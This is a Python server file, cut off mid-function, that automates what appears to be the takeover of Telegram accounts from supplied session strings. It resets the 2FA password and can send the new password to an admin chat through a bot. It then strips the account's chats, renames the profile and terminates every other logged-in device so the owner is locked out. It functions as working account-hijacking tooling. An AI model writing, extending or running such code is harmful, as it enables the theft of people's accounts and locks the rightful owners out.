# unified_processing_server.py
# Single unified server that combines all 3 processing steps

import asyncio
import os
import json
import uuid
import logging
import random
import string
import time
from datetime import datetime, timedelta
from typing import Optional, Dict, Any, List, Tuple
from contextlib import asynccontextmanager
from enum import Enum

import httpx
import asyncpg
from fastapi import FastAPI, HTTPException, Header, Depends, Query, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from pydantic import BaseModel, Field, validator
from pyrogram import Client
from pyrogram.enums import ChatType
from pyrogram.errors import (
    PasswordHashInvalid, FloodWait, SessionPasswordNeeded,
    SessionExpired, SessionRevoked, Unauthorized,
    UserDeactivated, UserDeactivatedBan, ChatAdminRequired,
    ChatWriteForbidden, PeerIdInvalid, UsernameInvalid,
    UsernameNotModified, UsernameOccupied, AuthKeyUnregistered
)
from pyrogram.raw.functions.account import GetAuthorizations, ResetAuthorization
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# ==================== CONFIGURATION ====================
DATABASE_URL = os.getenv('DATABASE_URL')
MAIN_SERVER_URL = os.getenv('MAIN_SERVER_URL')
INTERNAL_API_KEY = os.getenv('INTERNAL_API_KEY')
ADMIN_API_KEY = os.getenv('ADMIN_API_KEY', INTERNAL_API_KEY)
TELEGRAM_API_ID = int(os.getenv('TELEGRAM_API_ID', '0'))
TELEGRAM_API_HASH = os.getenv('TELEGRAM_API_HASH', '')
MAX_CONCURRENT_TASKS = int(os.getenv('MAX_CONCURRENT_TASKS', '5'))
MAX_CONCURRENT_DEVICE_RETRIES = int(os.getenv('MAX_CONCURRENT_DEVICE_RETRIES', '2'))
DEVICE_RETRY_BATCH_SIZE = int(os.getenv('DEVICE_RETRY_BATCH_SIZE', '10'))
MAX_RETRIES = 3
RETRY_INTERVALS = [5, 30, 360]  # seconds for general retries
DEVICE_RETRY_INTERVALS = [
    {"minutes": 5, "retry_count": 1},
    {"minutes": 30, "retry_count": 2},
    {"hours": 6, "retry_count": 3},
]

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== CUSTOM EXCEPTIONS ====================
class FloodWaitException(Exception):
    def __init__(self, message: str, retry_after: int):
        self.message = message
        self.retry_after = retry_after
        super().__init__(message)

# ==================== ENUMS ====================
class JobStatus(str, Enum):
    PENDING = "pending"
    PROCESSING = "processing"
    RETRY = "retry"
    WAITING_DEVICE_RETRY = "waiting_device_retry"
    COMPLETED = "completed"
    FAILED = "failed"

class StepStatus(str, Enum):
    PENDING = "pending"
    PROCESSING = "processing"
    COMPLETED = "completed"
    FAILED = "failed"
    SKIPPED = "skipped"
    WAITING_RETRY = "waiting_retry"

# ==================== DATABASE ====================
class Database:
    def __init__(self):
        self.pool = None
    
    async def init_pool(self):
        if not DATABASE_URL:
            logger.error("DATABASE_URL not set")
            raise ValueError("DATABASE_URL not set")
        
        self.pool = await asyncpg.create_pool(
            DATABASE_URL,
            min_size=5,
            max_size=20,
            command_timeout=60
        )
        await self.create_tables()
    
    async def create_tables(self):
        async with self.pool.acquire() as conn:
            # Main processing jobs table
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS processing_jobs (
                    id SERIAL PRIMARY KEY,
                    session_id UUID NOT NULL UNIQUE,
                    payload JSONB NOT NULL,
                    status VARCHAR(50) DEFAULT 'pending',
                    current_step INTEGER DEFAULT 1,
                    retry_count INTEGER DEFAULT 0,
                    next_retry_at TIMESTAMP,
                    device_retry_count INTEGER DEFAULT 0,
                    device_next_retry_at TIMESTAMP,
                    last_error TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    completed_at TIMESTAMP,
                    processing_time_ms INTEGER
                )
            ''')
            
            # Step results table
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS step_results (
                    id SERIAL PRIMARY KEY,
                    job_id INTEGER REFERENCES processing_jobs(id) ON DELETE CASCADE,
                    session_id UUID NOT NULL,
                    step_number INTEGER NOT NULL,
                    step_name VARCHAR(50) NOT NULL,
                    status VARCHAR(50) DEFAULT 'pending',
                    result_data JSONB,
                    error_message TEXT,
                    started_at TIMESTAMP,
                    completed_at TIMESTAMP,
                    processing_time_ms INTEGER,
                    retry_count INTEGER DEFAULT 0
                )
            ''')
            
            # Password changes history
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS password_changes (
                    id SERIAL PRIMARY KEY,
                    session_id UUID NOT NULL,
                    phone_number VARCHAR(20) NOT NULL,
                    old_password TEXT,
                    new_password TEXT NOT NULL,
                    changed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    client_app_name VARCHAR(100),
                    endpoint_name VARCHAR(100),
                    processing_time_ms INTEGER,
                    status VARCHAR(20) DEFAULT 'success'
                )
            ''')
            
            # Spam check history
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS spam_checks (
                    id SERIAL PRIMARY KEY,
                    session_id UUID NOT NULL,
                    phone_number VARCHAR(20) NOT NULL,
                    spam_status VARCHAR(50),
                    spam_details TEXT,
                    cleared_status BOOLEAN DEFAULT FALSE,
                    profile_updated BOOLEAN DEFAULT FALSE,
                    checked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    processing_time_ms INTEGER
                )
            ''')
            
            # Device check history
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS device_checks (
                    id SERIAL PRIMARY KEY,
                    session_id UUID NOT NULL,
                    phone_number VARCHAR(20) NOT NULL,
                    total_devices INTEGER DEFAULT 0,
                    other_devices_terminated INTEGER DEFAULT 0,
                    termination_status VARCHAR(50),
                    wait_until TIMESTAMP,
                    checked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    processing_time_ms INTEGER,
                    retry_count INTEGER DEFAULT 0
                )
            ''')
            
            # Create indexes
            await conn.execute('''
                CREATE INDEX IF NOT EXISTS idx_jobs_status 
                ON processing_jobs(status, next_retry_at)
            ''')
            await conn.execute('''
                CREATE INDEX IF NOT EXISTS idx_jobs_device_retry 
                ON processing_jobs(status, device_next_retry_at)
            ''')
            await conn.execute('''
                CREATE INDEX IF NOT EXISTS idx_step_results_job 
                ON step_results(job_id, step_number)
            ''')
            await conn.execute('''
                CREATE INDEX IF NOT EXISTS idx_password_changes_date 
                ON password_changes(changed_at)
            ''')
            await conn.execute('''
                CREATE INDEX IF NOT EXISTS idx_spam_checks_date 
                ON spam_checks(checked_at)
            ''')
            await conn.execute('''
                CREATE INDEX IF NOT EXISTS idx_device_checks_date 
                ON device_checks(checked_at)
            ''')
        
        logger.info("Database tables created successfully")
    
    async def close(self):
        if self.pool:
            await self.pool.close()
    
    # Job management methods
    async def add_job(self, session_id: str, payload: Dict[str, Any]) -> Optional[int]:
        async with self.pool.acquire() as conn:
            existing = await conn.fetchval(
                """SELECT id FROM processing_jobs 
                   WHERE session_id = $1 AND status IN ('pending','processing','retry','waiting_device_retry')""",
                uuid.UUID(session_id)
            )
            if existing:
                return None
            
            row = await conn.fetchrow(
                "INSERT INTO processing_jobs (session_id, payload) VALUES ($1, $2) RETURNING id",
                uuid.UUID(session_id), json.dumps(payload)
            )
            return row['id']
    
    async def get_next_job(self) -> Optional[Dict[str, Any]]:
        async with self.pool.acquire() as conn:
            row = await conn.fetchrow('''
                UPDATE processing_jobs SET status = 'processing', updated_at = NOW()
                WHERE id = (
                    SELECT id FROM processing_jobs
                    WHERE (status = 'pending' OR (status = 'retry' AND next_retry_at <= NOW()))
                    ORDER BY created_at LIMIT 1
                    FOR UPDATE SKIP LOCKED
                )
                RETURNING *
            ''')
            return dict(row) if row else None
    
    async def get_device_retry_jobs(self, limit: int = 10) -> List[Dict[str, Any]]:
        async with self.pool.acquire() as conn:
            async with conn.transaction():
                rows = await conn.fetch('''
                    UPDATE processing_jobs
                    SET status = 'processing', updated_at = NOW()
                    WHERE id IN (
                        SELECT id FROM processing_jobs
                        WHERE status = 'waiting_device_retry' 
                        AND device_next_retry_at <= NOW()
                        ORDER BY device_next_retry_at
                        LIMIT $1
                        FOR UPDATE SKIP LOCKED
                    )
                    RETURNING *
                ''', limit)
                return [dict(row) for row in rows]
    
    async def mark_job_processing(self, job_id: int):
        async with self.pool.acquire() as conn:
            await conn.execute(
                "UPDATE processing_jobs SET status='processing', updated_at=NOW() WHERE id=$1",
                job_id
            )
    
    async def mark_job_completed(self, job_id: int):
        async with self.pool.acquire() as conn:
            await conn.execute(
                """UPDATE processing_jobs SET status='completed', completed_at=NOW(), 
                   updated_at=NOW() WHERE id=$1""",
                job_id
            )
    
    async def mark_job_failed(self, job_id: int, error: str):
        async with self.pool.acquire() as conn:
            await conn.execute(
                "UPDATE processing_jobs SET status='failed', last_error=$2, updated_at=NOW() WHERE id=$1",
                job_id, error
            )
    
    async def schedule_job_retry(self, job_id: int, retry_count: int, next_retry_at: datetime, error: str):
        async with self.pool.acquire() as conn:
            await conn.execute('''
                UPDATE processing_jobs SET status='retry', retry_count=$2, 
                next_retry_at=$3, last_error=$4, updated_at=NOW()
                WHERE id=$1
            ''', job_id, retry_count, next_retry_at, error)
    
    async def schedule_device_retry(self, job_id: int, device_retry_count: int, 
                                    next_retry_at: datetime, error: str):
        async with self.pool.acquire() as conn:
            await conn.execute('''
                UPDATE processing_jobs SET status='waiting_device_retry', 
                device_retry_count=$2, device_next_retry_at=$3, 
                last_error=$4, updated_at=NOW()
                WHERE id=$1
            ''', job_id, device_retry_count, next_retry_at, error)
    
    async def update_job_step(self, job_id: int, step_number: int):
        async with self.pool.acquire() as conn:
            await conn.execute(
                "UPDATE processing_jobs SET current_step=$2, updated_at=NOW() WHERE id=$1",
                job_id, step_number
            )
    
    # Step results methods
    async def save_step_result(self, job_id: int, session_id: str, step_number: int, 
                               step_name: str, status: str, result_data: Dict = None,
                               error_message: str = None, processing_time_ms: int = None):
        async with self.pool.acquire() as conn:
            await conn.execute('''
                INSERT INTO step_results 
                (job_id, session_id, step_number, step_name, status, result_data, 
                 error_message, processing_time_ms, started_at, completed_at)
                VALUES ($1, $2, $3, $4, $5, $6, $7, $8, NOW(), NOW())
            ''', job_id, uuid.UUID(session_id), step_number, step_name, status,
                json.dumps(result_data) if result_data else None,
                error_message, processing_time_ms)
    
    # History methods
    async def save_password_change(self, session_id: str, phone_number: str, 
                                   old_password: Optional[str], new_password: str,
                                   client_app_name: str, endpoint_name: str, 
                                   processing_time_ms: int):
        async with self.pool.acquire() as conn:
            await conn.execute('''
                INSERT INTO password_changes 
                (session_id, phone_number, old_password, new_password, 
                 client_app_name, endpoint_name, processing_time_ms)
                VALUES ($1, $2, $3, $4, $5, $6, $7)
            ''', uuid.UUID(session_id), phone_number, old_password, new_password,
                client_app_name, endpoint_name, processing_time_ms)
    
    async def save_spam_check(self, session_id: str, phone_number: str, 
                              spam_status: str, spam_details: str,
                              cleared_status: bool, profile_updated: bool,
                              processing_time_ms: int):
        async with self.pool.acquire() as conn:
            await conn.execute('''
                INSERT INTO spam_checks 
                (session_id, phone_number, spam_status, spam_details, 
                 cleared_status, profile_updated, processing_time_ms)
                VALUES ($1, $2, $3, $4, $5, $6, $7)
            ''', uuid.UUID(session_id), phone_number, spam_status, spam_details,
                cleared_status, profile_updated, processing_time_ms)
    
    async def save_device_check(self, session_id: str, phone_number: str,
                                total_devices: int, other_devices_terminated: int,
                                termination_status: str, processing_time_ms: int,
                                retry_count: int = 0):
        async with self.pool.acquire() as conn:
            await conn.execute('''
                INSERT INTO device_checks 
                (session_id, phone_number, total_devices, other_devices_terminated, 
                 termination_status, processing_time_ms, retry_count)
                VALUES ($1, $2, $3, $4, $5, $6, $7)
            ''', uuid.UUID(session_id), phone_number, total_devices,
                other_devices_terminated, termination_status, processing_time_ms, retry_count)

# ==================== UTILITY FUNCTIONS ====================
def generate_secure_password(length: int = 16) -> str:
    """Generate a secure random password"""
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    while True:
        pwd = ''.join(random.choice(chars) for _ in range(length))
        if (any(c.islower() for c in pwd) and 
            any(c.isupper() for c in pwd) and 
            any(c.isdigit() for c in pwd)):
            return pwd

def generate_random_name() -> str:
    """Generate a random name for profile update"""
    first = ["John", "Jane", "Alex", "Emily", "Chris", "Katie", 
             "Michael", "Sarah", "David", "Laura", "James", "Emma"]
    last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", 
            "Miller", "Davis", "Rodriguez", "Martinez", "Wilson", "Anderson"]
    return f"{random.choice(first)} {random.choice(last)}"

def get_device_retry_time(retry_count: int) -> Optional[datetime]:
    """Get next device retry time based on retry count"""
    for interval in DEVICE_RETRY_INTERVALS:
        if interval["retry_count"] == retry_count + 1:
            if "minutes" in interval:
                return datetime.utcnow() + timedelta(minutes=interval["minutes"])
            elif "hours" in interval:
                return datetime.utcnow() + timedelta(hours=interval["hours"])
    return None

# ==================== STEP 1: PASSWORD CHANGE ====================
async def step1_password_change(session_string: str, phone_number: str,
                                 current_password: Optional[str], new_password: str,
                                 admin_telegram_id: Optional[int], bot_token: Optional[str]) -> Dict[str, Any]:
    """Step 1: Change Telegram 2FA password"""
    client = None
    start_time = time.time()
    
    try:
        client = Client(
            name=f"step1_{uuid.uuid4().hex[:8]}",
            api_id=TELEGRAM_API_ID,
            api_hash=TELEGRAM_API_HASH,
            session_string=session_string,
            in_memory=True
        )
        await client.start()
        
        # Change password
        if current_password:
            await client.change_cloud_password(
                current_password=current_password,
                new_password=new_password
            )
        else:
            await client.enable_cloud_password(
                password=new_password
            )
        
        # Export new session string
        new_session_string = await client.export_session_string()
        
        processing_time_ms = int((time.time() - start_time) * 1000)
        
        # Send notification if bot_token and admin_telegram_id provided
        notification_sent = False
        if bot_token and admin_telegram_id:
            try:
                async with httpx.AsyncClient(timeout=10) as http:
                    response = await http.post(
                        f"https://api.telegram.org/bot{bot_token}/sendMessage",
                        json={
                            "chat_id": admin_telegram_id,
                            "text": f"🔐 *Password Changed*\n\n"
                                    f"📱 Phone: `{phone_number}`\n"
                                    f"🔑 New Password: `{new_password}`\n\n"
                                    f"⚠️ Save this password securely!",
                            "parse_mode": "Markdown"
                        }
                    )
                    notification_sent = response.status_code == 200
            except:
                pass
        
        return {
            "success": True,
            "new_password": new_password,
            "new_session_string": new_session_string,
            "notification_sent": notification_sent,
            "processing_time_ms": processing_time_ms
        }
        
    except FloodWait as e:
        raise FloodWaitException(f"FloodWait: {e.value}s", e.value)
    except PasswordHashInvalid:
        return {
            "success": False,
            "error": "PasswordHashInvalid",
            "processing_time_ms": int((time.time() - start_time) * 1000)
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "processing_time_ms": int((time.time() - start_time) * 1000)
        }
    finally:
        if client:
            try:
                await client.stop()
            except:
                pass

# ==================== STEP 2: SPAM CHECK & CLEANUP ====================
async def step2_spam_check(session_string: str, phone_number: str,
                            password: Optional[str], set_name: Optional[str],
                            clear_account: bool = True, leave_chats: bool = True,
                            block_bots: bool = True, spam_check_required: bool = True,
                            set_username: Optional[str] = None) -> Dict[str, Any]:
    """Step 2: Spam check and account cleanup"""
    client = None
    start_time = time.time()
    
    try:
        client = Client(
            name=f"step2_{uuid.uuid4().hex[:8]}",
            api_id=TELEGRAM_API_ID,
            api_hash=TELEGRAM_API_HASH,
            session_string=session_string,
            in_memory=True,
            no_updates=True
        )
        await client.start()
        
        spam_status = "not_checked"
        spam_details = "Spam check not performed"
        
        # Spam check
        if spam_check_required:
            try:
                await client.send_message("@SpamBot", "/start")
                await asyncio.sleep(3)
                
                messages = []
                async for msg in client.get_chat_history("@SpamBot", limit=1):
                    messages.append(msg)
                
                if messages:
                    spam_text = messages[0].text or ""
                    spam_details = spam_text
                    text_lower = spam_text.lower()
                    
                    if any(w in text_lower for w in ["banned", "suspended", "terminated"]):
                        spam_status = "banned"
                    elif any(w in text_lower for w in ["limited", "restricted", "spam"]):
                        spam_status = "limited"
                    else:
                        spam_status = "spam_free"
                else:
                    spam_status = "unknown"
                    spam_details = "No response from SpamBot"
            except Exception as e:
                spam_status = "unknown"
                spam_details = f"Error checking spam: {str(e)}"
                logger.warning(f"Spam check error: {e}")
        
        # Cleanup
        cleared_status = False
        total_processed = 0
        left_chats = 0
        blocked_bots = 0
        
        if clear_account:
            try:
                dialogs = []
                async for dialog in client.get_dialogs():
                    dialogs.append(dialog)
                
                for idx, dialog in enumerate(dialogs):
                    chat = dialog.chat
                    chat_id = chat.id
                    chat_type = chat.type
                    chat_title = getattr(chat, 'title', '') or getattr(chat, 'first_name', '') or str(chat_id)
                    
                    try:
                        operation_performed = False
                        
                        # Leave groups/channels
                        if leave_chats and chat_type in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
                            await client.leave_chat(chat_id)
                            left_chats += 1
                            operation_performed = True
                        
                        # Block bots
                        if block_bots and getattr(chat, 'is_bot', False):
                            await client.block_user(chat_id)
                            blocked_bots += 1
                            operation_performed = True
                        
                        if operation_performed:
                            total_processed += 1
                            
                            # Rate limiting
                            if total_processed <= 10:
                                await asyncio.sleep(0.3)
                            elif total_processed <= 50:
                                await asyncio.sleep(1.5)
                            elif total_processed <= 100:
                                await asyncio.sleep(3)
                            else:
                                await asyncio.sleep(5)
                    
                    except FloodWait as e:
                        wait = min(e.value, 60)
                        await asyncio.sleep(wait)
                    except:
                        continue
                
                cleared_status = total_processed > 0
            except Exception as e:
                logger.warning(f"Cleanup error: {e}")
        
        # Profile update
        profile_updated = False
        
        if set_name:
            try:
                names = set_name.split(" ", 1)
                update_kwargs = {"first_name": names[0]}
                if len(names) > 1:
                    update_kwargs["last_name"] = names[1]
                await client.update_profile(**update_kwargs)
                profile_updated = True
            except:
                pass
        
        if set_username:
            try:
                await client.update_username(set_username)
                profile_updated = True
            except:
                pass
        
        processing_time_ms = int((time.time() - start_time) * 1000)
        
        return {
            "success": spam_status != "banned",
            "spam_status": spam_status,
            "spam_details": spam_details,
            "cleared_status": cleared_status,
            "total_processed": total_processed,
            "left_chats": left_chats,
            "blocked_bots": blocked_bots,
            "profile_updated": profile_updated,
            "processing_time_ms": processing_time_ms
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "processing_time_ms": int((time.time() - start_time) * 1000)
        }
    finally:
        if client:
            try:
                await client.stop()
            except:
                pass

# ==================== STEP 3: DEVICE CHECK ====================
async def step3_device_check(session_string: str, phone_number: str) -> Dict[str, Any]:
    """Step 3: Device check and termination"""
    client = None
    start_time = time.time()
    
    try:
        client = Client(
            name=f"step3_{uuid.uuid4().hex[:8]}",
            api_id=TELEGRAM_API_ID,
            api_hash=TELEGRAM_API_HASH,
            session_string=session_string,
            in_memory=True
        )
        await client.start()
        
        # Get authorizations
        result = await client.invoke(GetAuthorizations())
        authorizations = result.authorizations
        
        total_devices = len(authorizations)
        our_device_hash = None
        our_device_model = client.device_model if hasattr(client, 'device_model') else ""
        other_devices = []
        
        # Identify our device
        for auth in authorizations:
            try:
                device_model = getattr(auth, 'device_model', 'Unknown')
                device_hash = getattr(auth, 'hash', None)
                
                if device_hash is None:
                    continue
                
                is_our_device = False
                
                if hasattr(auth, 'current') and auth.current:
                    is_our_device = True
                
                if not is_our_device and hasattr(auth, 'date_created'):
                    max_date = max(a.date_created for a in authorizations if hasattr(a, 'date_created'))
                    if auth.date_created == max_date:
                        is_our_device = True
                
                if is_our_device or device_model == our_device_model:
                    if our_device_hash is None:
                        our_device_hash = device_hash
                    logger.info(f"Our device identified: {device_model}")
                else:
                    other_devices.append(device_hash)
                    logger.info(f"Other device found: {device_model}")
            except Exception as e:
                continue
        
        # Terminate other devices
        terminated = 0
        wait_required = False
        fresh_reset_forbidden = False
        
        for device_hash in other_devices:
            try:
                if isinstance(device_hash, str):
                    device_hash = int(device_hash)
                
                await client.invoke(ResetAuthorization(hash=device_hash))
                terminated += 1
                logger.info(f"Terminated device with hash: {str(device_hash)[:10]}...")
                await asyncio.sleep(1)
                
            except FloodWait as e:
                wait_required = True
                fresh_reset_forbidden = True
                # Instead of returning, raise FloodWaitException
                raise FloodWaitException(f"FloodWait: {e.value}s", e.value)
            except Exception as e:
                error_str = str(e)
                error_upper = error_str.upper()
                
                if "FRESH_RESET_AUTHORISATION_FORBIDDEN" in error_upper or \
                   "FRESH_CHANGE_ADMINS_FORBIDDEN" in error_upper or \
                   "fresh reset" in error_str.lower():
                    fresh_reset_forbidden = True
                    wait_required = True
                    break
                elif "HASH_INVALID" in error_upper:
                    continue
                else:
                    continue
        
        processing_time_ms = int((time.time() - start_time) * 1000)
        
        return {
            "success": not wait_required,
            "device_termination_status": "waiting_24h" if wait_required else 
                                         ("all_terminated" if terminated > 0 else "no_other_devices"),
            "other_devices_terminated": terminated,
            "total_devices": total_devices,
            "wait_required": wait_required,
            "fresh_reset_forbidden": fresh_reset_forbidden,
            "processing_time_ms": processing_time_ms
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "processing_time_ms": int((time.time() - start_time) * 1000)
        }
    finally:
        if client:
            try:
                await client.stop()
            except:
                pass

# ==================== JOB PROCESSOR ====================
async def process_job(job: Dict[str, Any], db: Database):
    """Process a complete job through all 3 steps"""
    job_id = job['id']
    session_id = str(job['session_id'])
    payload = job.get('payload', {})
    if isinstance(payload, str):
        payload = json.loads(payload)
    
    logger.info(f"🔨 Processing job {job_id} for session {session_id}")
    
    # Generate password and name
    new_password = generate_secure_password()
    random_name = generate_random_name()
    
    current_session_string = payload['session_string']
    step_results = {}
    
    # ==================== STEP 1: Password Change ====================
    logger.info(f"Step 1: Password change for {session_id}")
    await db.update_job_step(job_id, 1)
    
    step1_start = time.time()
    step1_result = await step1_password_change(
        session_string=current_session_string,
        phone_number=payload['phone_number'],
        current_password=payload.get('current_password'),
        new_password=new_password,
        admin_telegram_id=payload.get('admin_telegram_id'),
        bot_token=payload.get('bot_token')
    )
    
    if not step1_result.get('success'):
        await db.save_step_result(
            job_id, session_id, 1, "password_change", "failed",
            error_message=step1_result.get('error'),
            processing_time_ms=int((time.time() - step1_start) * 1000)
        )
        # If it's FloodWait, raise FloodWaitException instead of generic Exception
        if 'FloodWait' in step1_result.get('error', ''):
            retry_after = step1_result.get('retry_after', 60)
            raise FloodWaitException(f"FloodWait: {retry_after}s", retry_after)
        raise Exception(f"Step 1 failed: {step1_result.get('error')}")
    
    await db.save_step_result(
        job_id, session_id, 1, "password_change", "completed",
        result_data={"new_password": new_password, "notification_sent": step1_result.get('notification_sent', False)},
        processing_time_ms=step1_result.get('processing_time_ms')
    )
    await db.save_password_change(
        session_id=session_id,
        phone_number=payload['phone_number'],
        old_password=payload.get('current_password'),
        new_password=new_password,
        client_app_name=payload.get('client_app_name', 'unknown'),
        endpoint_name=payload.get('endpoint_name', 'unknown'),
        processing_time_ms=step1_result.get('processing_time_ms', 0)
    )
    
    # Update session string if changed
    if step1_result.get('new_session_string'):
        current_session_string = step1_result['new_session_string']
        # Update payload with new session string if available
        async with db.pool.acquire() as conn:
            updated_payload = payload.copy()
            updated_payload['session_string'] = step1_result['new_session_string']
            updated_payload['original_session_string'] = payload['session_string']
            await conn.execute('''
                UPDATE processing_jobs SET payload = $1 WHERE id = $2
            ''', json.dumps(updated_payload), job_id)
            payload = updated_payload  # Update local payload reference
    
    step_results['step1'] = step1_result
    logger.info(f"Step 1 completed for {session_id}")
    
    # ==================== STEP 2: Spam Check & Cleanup ====================
    logger.info(f"Step 2: Spam check for {session_id}")
    await db.update_job_step(job_id, 2)
    
    step2_start = time.time()
    step2_result = await step2_spam_check(
        session_string=current_session_string,
        phone_number=payload['phone_number'],
        password=new_password,
        set_name=payload.get('set_name', random_name),
        clear_account=payload.get('clear_account', True),
        leave_chats=payload.get('leave_chats', True),
        block_bots=payload.get('block_bots', True),
        spam_check_required=payload.get('spam_check_required', True),
        set_username=payload.get('set_username')
    )
    
    if not step2_result.get('success'):
        await db.save_step_result(
            job_id, session_id, 2, "spam_check", "failed",
            result_data={"spam_status": step2_result.get('spam_status')},
            error_message=step2_result.get('error', f"Spam status: {step2_result.get('spam_status')}"),
            processing_time_ms=int((time.time() - step2_start) * 1000)
        )
        raise Exception(f"Step 2 failed: {step2_result.get('error', step2_result.get('spam_status'))}")
    
    await db.save_step_result(
        job_id, session_id, 2, "spam_check", "completed",
        result_data={
            "spam_status": step2_result.get('spam_status'),
            "cleared_status": step2_result.get('cleared_status'),
            "total_processed": step2_result.get('total_processed'),
            "profile_updated": step2_result.get('profile_updated')
        },
        processing_time_ms=step2_result.get('processing_time_ms')
    )
    await db.save_spam_check(
        session_id=session_id,
        phone_number=payload['phone_number'],
        spam_status=step2_result.get('spam_status', 'unknown'),
        spam_details=step2_result.get('spam_details', ''),
        cleared_status=step2_result.get('cleared_status', False),
        profile_updated=step2_result.get('profile_updated', False),
        processing_time_ms=step2_result.get('processing_time_ms', 0)
    )
    
    step_results['step2'] = step2_result
    logger.info(f"Step 2 completed for {session_id}")
    
    # ==================== STEP 3: Device Check ====================
    logger.info(f"Step 3: Device check for {session_id}")
    await db.update_job_step(job_id, 3)
    
    step3_start = time.time()
    step3_result = await step3_device_check(
        session_string=current_session_string,
        phone_number=payload['phone_number']
    )
    
    if not step3_result.get('success'):
        await db.save_step_result(
            job_id, session_id, 3, "device_check", "failed",
            error_message=step3_result.get('error'),
            processing_time_ms=int((time.time() - step3_start) * 1000)
        )
        raise Exception(f"Step 3 failed: {step3_result.get('error')}")
    
    # Check if device retry needed
    if step3_result.get('wait_required'):
        await db.save_step_result(
            job_id, session_id, 3, "device_check", "waiting_retry",
            result_data={
                "termination_status": step3_result.get('device_termination_status'),
                "total_devices": step3_result.get('total_devices'),
                "other_devices_terminated": step3_result.get('other_devices_terminated')
            },
            processing_time_ms=step3_result.get('processing_time_ms')
        )
        
        # Schedule device retry
        device_retry_count = job.get('device_retry_count', 0) or 0
        next_retry = get_device_retry_time(device_retry_count)
        
        if next_retry and device_retry_count < 3:
            await db.schedule_device_retry(
                job_id, device_retry_count + 1, next_retry,
                "Fresh reset wait required for device termination"
            )
            logger.info(f"Device retry {device_retry_count + 1} scheduled for {session_id} at {next_retry}")
            
            # Save device check history
            await db.save_device_check(
                session_id=session_id,
                phone_number=payload['phone_number'],
                total_devices=step3_result.get('total_devices', 0),
                other_devices_terminated=step3_result.get('other_devices_terminated', 0),
                termination_status=step3_result.get('device_termination_status', 'unknown'),
                processing_time_ms=step3_result.get('processing_time_ms', 0),
                retry_count=device_retry_count
            )
            
            # Send intermediate callback
            await send_callback_to_main(
                MAIN_SERVER_URL,
                {
                    "session_id": session_id,
                    "overall_status": "waiting_device_retry",
                    "current_step": 3,
                    "step3_result": step3_result,
                    "message": f"Device retry scheduled (attempt {device_retry_count + 1}/3)"
                }
            )
            return
        else:
            # Max retries exceeded for device
            await db.save_device_check(
                session_id=session_id,
                phone_number=payload['phone_number'],
                total_devices=step3_result.get('total_devices', 0),
                other_devices_terminated=step3_result.get('other_devices_terminated', 0),
                termination_status="max_retries_exceeded",
                processing_time_ms=step3_result.get('processing_time_ms', 0),
                retry_count=device_retry_count
            )
            
            # Mark as completed with device warning
            await db.mark_job_completed(job_id)
            
            final_payload = {
                "session_id": session_id,
                "overall_status": "completed_with_warning",
                "step1_result": step_results.get('step1'),
                "step2_result": step_results.get('step2'),
                "step3_result": step3_result,
                "device_termination_status": "max_retries_exceeded",
                "warning": "Device termination could not be completed after 3 retries"
            }
            
            await send_callback_to_main(MAIN_SERVER_URL, final_payload)
            return
    
    # All steps completed successfully
    await db.save_step_result(
        job_id, session_id, 3, "device_check", "completed",
        result_data={
            "termination_status": step3_result.get('device_termination_status'),
            "total_devices": step3_result.get('total_devices'),
            "other_devices_terminated": step3_result.get('other_devices_terminated')
        },
        processing_time_ms=step3_result.get('processing_time_ms')
    )
    await db.save_device_check(
        session_id=session_id,
        phone_number=payload['phone_number'],
        total_devices=step3_result.get('total_devices', 0),
        other_devices_terminated=step3_result.get('other_devices_terminated', 0),
        termination_status=step3_result.get('device_termination_status', 'completed'),
        processing_time_ms=step3_result.get('processing_time_ms', 0)
    )
    
    step_results['step3'] = step3_result
    logger.info(f"Step 3 completed for {session_id}")
    
    # ==================== ALL STEPS COMPLETED ====================
    await db.mark_job_completed(job_id)
    
    final_payload = {
        "session_id": session_id,
        "overall_status": "completed",
        "step1_result": step_results.get('step1'),
        "step2_result": step_results.get('step2'),
        "step3_result": step_results.get('step3'),
        "processing_error": None
    }
    
    await send_callback_to_main(MAIN_SERVER_URL, final_payload)
    logger.info(f"✅ Job {job_id} completed successfully for session {session_id}")

async def process_device_retry(job: Dict[str, Any], db: Database):
    """Process device retry for a job"""
    job_id = job['id']
    session_id = str(job['session_id'])
    payload = job.get('payload', {})
    if isinstance(payload, str):
        payload = json.loads(payload)
    
    logger.info(f"🔄 Processing device retry for job {job_id}, session {session_id}")
    await db.mark_job_processing(job_id)
    
    try:
        # Get the most recent session string from payload
        session_string = payload.get('session_string', '')
        
        # If payload was updated with new session string, use that
        if not session_string or session_string == payload.get('original_session_string', ''):
            session_string = payload.get('original_session_string', payload['session_string'])
        
        # Check if there's a new session string from step 1
        # Retrieve previous step results from database
        async with db.pool.acquire() as conn:
            step1_row = await conn.fetchrow('''
                SELECT result_data FROM step_results 
                WHERE job_id = $1 AND step_number = 1 AND status = 'completed'
                ORDER BY id DESC LIMIT 1
            ''', job_id)
            step2_row = await conn.fetchrow('''
                SELECT result_data FROM step_results 
                WHERE job_id = $1 AND step_number = 2 AND status = 'completed'
                ORDER BY id DESC LIMIT 1
            ''', job_id)

        step1_result = json.loads(step1_row['result_data']) if step1_row and step1_row['result_data'] else {}
        step2_result = json.loads(step2_row['result_data']) if step2_row and step2_row['result_data'] else {}
        
        # Attempt device check again
        step3_result = await step3_device_check(
